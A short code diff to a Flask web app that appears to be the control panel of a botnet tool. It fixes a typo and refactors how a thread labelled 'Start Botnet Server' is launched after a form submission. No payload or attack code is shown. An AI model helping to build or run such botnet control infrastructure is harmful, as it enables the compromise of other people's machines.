@@ -1,10 +1,10 @@
 from flask import Flask, request, render_template
 import threading
-from gui.server_run import run_server
+from gui.server_run import ServerRunner
 
 
 
-app = Flask(__name__, stati_folder="gui/static", template_folder="gui/templates")
+app = Flask(__name__, static_folder="gui/static", template_folder="gui/templates")
 
 @app.route('/', methods=['GET', 'POST'])
 def get_data():
@@ -22,10 +22,10 @@ def get_data():
         file.close()
 
         # Start Botnet Server
-        thread = threading.Thread(target=run_server, args=())
+        srv_run = ServerRunner()
+        thread = threading.Thread(target=srv_run.run_server, args=())
         thread.daemon = True
         thread.start()
-
 
         return render_template('good.html')
     else:
